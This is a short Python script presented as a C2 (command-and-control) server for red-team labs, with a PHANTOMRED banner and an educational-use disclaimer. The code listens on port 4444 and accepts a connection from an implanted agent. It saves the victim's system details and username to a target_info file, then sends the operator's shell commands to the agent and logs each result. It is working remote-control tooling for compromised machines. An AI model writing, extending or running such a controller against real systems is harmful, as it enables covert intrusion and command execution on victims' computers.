# ============================================================
# C2 Server - Attacker Controller
# Listens for incoming agent connections and sends commands
# For educational use only - run in lab environment
# ============================================================

RED = '\033[91m'
RESET = '\033[0m'
WHITE = '\033[97m'

print(f"""{RED}
 ██▓███   ██░ ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ ▒█████   ███▄ ▄███▓ ██▀███  ▓█████ ▓█████▄ 
▓██░  ██▒▓██░ ██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌
▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▓██ ░▄█ ▒▒███   ░██   █▌
▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌
▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒░██▓ ▒██▒░▒████▒░▒████▓ 
▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ 
░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░ ░  ░      ░  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒ 
░░        ░  ░░ ░  ░   ▒      ░   ░ ░   ░      ░ ░ ░ ▒  ░      ░     ░░   ░    ░    ░ ░  ░ 
          ░  ░  ░      ░  ░         ░              ░ ░         ░      ░        ░  ░   ░    
                                                                                    ░      
{RESET}{WHITE}
{RED}[ Educational Use Only | Lab Environment | Red Team Simulation ]{RESET}
""")

import socket
import datetime

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"[*] C2 Server listening on {HOST}:{PORT}")

    conn, addr = server_socket.accept()
    print(f"[+] Agent connected from {addr[0]}:{addr[1]}")
    server_socket.close()

    # Initial Information of System
    info = conn.recv(4096)
    print(f"[Agent]: {info.decode()}\n")
    username = ""
    for line in info.decode().split("\n"):
        if "[User]" in line:
            username = line.split(":")[1].strip()
            break
    name = f"{username}_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    directory = "../target_info/" + name
    # Saving info as text file
    with open(directory, 'w+') as f:
        f.write(info.decode())
        print("File saved")

    while True:
        try:
            command = input("[C2]> ").strip()
            if not command:
                continue
            conn.sendall(command.encode())
            response = conn.recv(4096)
            print(f"[Agent]: {response.decode()}\n")
            # Saving info
            with open(directory, 'a') as f:
                f.write(f"\n[CMD]: {command}\n[OUT]: {response.decode()}\n")
        except KeyboardInterrupt:
            print("\n[!] Shutting down server")
            break
        except Exception as e:
            print(f"[!] Connection lost: {e}")
            break

    conn.close()

if __name__ == "__main__":
    start_server()
